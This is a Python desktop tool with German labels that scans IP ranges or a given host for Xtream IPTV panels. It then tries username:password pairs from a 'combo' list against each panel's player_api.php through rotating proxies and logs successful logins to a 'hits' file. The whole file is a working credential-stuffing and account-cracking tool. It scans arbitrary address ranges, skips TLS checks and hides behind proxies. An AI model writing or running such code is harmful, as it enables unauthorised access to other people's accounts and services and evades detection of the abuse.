import customtkinter as ctk
import requests
import ipaddress
import concurrent.futures
import urllib3
import logging
from datetime import datetime
import threading
from tkinter import filedialog
import itertools
from urllib.parse import urlparse

# SSL Warnungen unterdrücken
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- LOGGING ---
logging.basicConfig(
    filename='xtream_m3u_scanner_2026.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class XtreamUltimateScanner(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Xtream & M3U Pro Scanner 2026 - Strict Edition")
        self.geometry("1100x950") 
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.proxy_pool = None

        # --- SIDEBAR ---
        self.sidebar = ctk.CTkFrame(self, width=320, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        self.logo_label = ctk.CTkLabel(self.sidebar, text="SCANNER CONFIG 2026", font=ctk.CTkFont(size=18, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))

        # NEU: M3U / Einzel-URL Input
        self.url_input = ctk.CTkEntry(self.sidebar, placeholder_text="M3U URL oder Host (z.B. http://host:port)", width=260)
        self.url_input.grid(row=1, column=0, padx=20, pady=(5, 10))
        
        ctk.CTkLabel(self.sidebar, text="─ ODER IP-BEREICH ─", font=ctk.CTkFont(size=10)).grid(row=2, column=0, pady=5)

        self.ip_start = ctk.CTkEntry(self.sidebar, placeholder_text="Start IP", width=260)
        self.ip_start.grid(row=3, column=0, padx=20, pady=5)
        self.ip_end = ctk.CTkEntry(self.sidebar, placeholder_text="End IP", width=260)
        self.ip_end.grid(row=4, column=0, padx=20, pady=5)

        self.port_input = ctk.CTkEntry(self.sidebar, placeholder_text="Ports (80, 8080, 25461)", width=260)
        self.port_input.insert(0, "80, 8080, 8880, 25461")
        self.port_input.grid(row=5, column=0, padx=20, pady=10)

        # Combo Auswahl (PFLICHT)
        self.combo_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        self.combo_frame.grid(row=6, column=0, padx=20, pady=(15, 0))
        self.combo_input = ctk.CTkEntry(self.combo_frame, placeholder_text="Combo .txt wählen...", width=200)
        self.combo_input.grid(row=0, column=0, padx=(0, 5))
        self.browse_combo_btn = ctk.CTkButton(self.combo_frame, text="...", width=45, command=lambda: self.browse_file(self.combo_input))
        self.browse_combo_btn.grid(row=0, column=1)
        ctk.CTkLabel(self.sidebar, text="TXT-Datei (user:pass) erforderlich", font=ctk.CTkFont(size=10), text_color="#aaaaaa").grid(row=7, column=0, padx=20, pady=(0, 10), sticky="w")

        # Proxy Auswahl (PFLICHT)
        self.proxy_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        self.proxy_frame.grid(row=8, column=0, padx=20, pady=(5, 0))
        self.proxy_input = ctk.CTkEntry(self.proxy_frame, placeholder_text="Proxy .txt wählen...", width=200)
        self.proxy_input.grid(row=0, column=0, padx=(0, 5))
        self.browse_proxy_btn = ctk.CTkButton(self.proxy_frame, text="...", width=45, command=lambda: self.browse_file(self.proxy_input))
        self.browse_proxy_btn.grid(row=0, column=1)
        ctk.CTkLabel(self.sidebar, text="TXT-Datei (ip:port) erforderlich", font=ctk.CTkFont(size=10), text_color="#aaaaaa").grid(row=9, column=0, padx=20, pady=(0, 10), sticky="w")

        self.scan_button = ctk.CTkButton(self.sidebar, text="SCAN STARTEN", command=self.start_scan_thread, font=ctk.CTkFont(weight="bold"), fg_color="#2ecc71", hover_color="#27ae60")
        self.scan_button.grid(row=10, column=0, padx=20, pady=25)

        self.status_label = ctk.CTkLabel(self.sidebar, text="Status: Bereit", text_color="gray")
        self.status_label.grid(row=11, column=0, padx=20, pady=5)

        self.info_text = ctk.CTkLabel(self.sidebar, text="HINWEIS: IP-Bereich oder M3U/URL scannen. Combo & Proxy sind zwingend erforderlich.", font=ctk.CTkFont(size=11, slant="italic"), text_color="#3498db", wraplength=260, justify="left")
        self.info_text.grid(row=12, column=0, padx=20, pady=(20, 10), sticky="w")

        # --- LOGGING AREA ---
        self.log_textbox = ctk.CTkTextbox(self, width=700, corner_radius=10, font=("Consolas", 12))
        self.log_textbox.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")
        self.log_textbox.configure(state="disabled")

    def browse_file(self, target_entry):
        filename = filedialog.askopenfilename(title="Datei auswählen", filetypes=(("Textdateien", "*.txt"), ("Alle Dateien", "*.*")))
        if filename:
            target_entry.delete(0, "end")
            target_entry.insert(0, filename)

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_textbox.configure(state="normal")
        self.log_textbox.insert("end", f"[{timestamp}] {message}\n")
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")
        logging.info(message)

    def extract_base_url(self, raw_url):
        """Extrahiert Host und Port aus einer M3U-URL oder einem Host-String."""
        if not raw_url.startswith("http"):
            raw_url = "http://" + raw_url
        parsed = urlparse(raw_url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def check_xtream_api(self, base_url, combos):
        """Validiert Combos gegen die Xtream Player API."""
        current_proxy = next(self.proxy_pool)
        p_dict = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"}

        try:
            # 1. Erreichbarkeit prüfen
            resp = requests.get(f"{base_url}/player_api.php", timeout=5, verify=False, proxies=p_dict)
            if resp.status_code == 200:
                self.log(f"[*] Panel gefunden: {base_url} (Proxy: {current_proxy})")
                for combo in combos:
                    if ":" not in combo: continue
                    u, p = combo.strip().split(":", 1)
                    api_url = f"{base_url}/player_api.php?username={u.strip()}&password={p.strip()}"
                    auth = requests.get(api_url, timeout=5, verify=False, proxies=p_dict)
                    if "user_info" in auth.text:
                        hit = f"HIT: {base_url} | {u}:{p}"
                        self.log(hit)
                        with open("hits_m3u_2026.txt", "a") as f: f.write(hit + "\n")
                        return True
        except Exception:
            pass
        return False

    def start_scan_thread(self):
        threading.Thread(target=self.run_scanner, daemon=True).start()

    def run_scanner(self):
        input_url = self.url_input.get().strip()
        s_ip = self.ip_start.get().strip()
        e_ip = self.ip_end.get().strip()
        port_list = [p.strip() for p in self.port_input.get().split(",")]
        combo_path = self.combo_input.get().strip()
        proxy_path = self.proxy_input.get().strip()

        # STRIKTE VALIDIERUNG
        if not combo_path or not proxy_path:
            self.log("ABBRUCH: Combo- UND Proxy-Datei (.txt) sind zwingend erforderlich!")
            return

        try:
            # Dateien laden
            with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
                proxies = [l.strip() for l in f if l.strip()]
            with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
                combos = f.readlines()

            if not proxies or not combos:
                self.log("ABBRUCH: Eine der Dateien ist leer!")
                return
            
            self.proxy_pool = itertools.cycle(proxies)
            self.status_label.configure(text="Status: Scanne...", text_color="yellow")

            # MODUS 1: Einzel-M3U/URL
            if input_url:
                base = self.extract_base_url(input_url)
                self.log(f"[*] Starte gezielten Scan auf Host: {base}")
                self.check_xtream_api(base, combos)

            # MODUS 2: IP-Bereich
            elif s_ip and e_ip:
                start_addr = int(ipaddress.IPv4Address(s_ip))
                end_addr = int(ipaddress.IPv4Address(e_ip))
                ips = [str(ipaddress.IPv4Address(ip)) for ip in range(start_addr, end_addr + 1)]
                self.log(f"[*] Bereichs-Scan gestartet ({len(ips)} IPs)...")
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
                    for ip in ips:
                        for port in port_list:
                            url = f"http://{ip}:{port}"
                            executor.submit(self.check_xtream_api, url, combos)
            else:
                self.log("FEHLER: URL oder IP-Bereich angeben!")

            self.log("--- VORGANG BEENDET ---")
            self.status_label.configure(text="Status: Fertig", text_color="green")
        except Exception as e:
            self.log(f"FEHLER: {e}")

if __name__ == "__main__":
    app = XtreamUltimateScanner()
    app.mainloop()
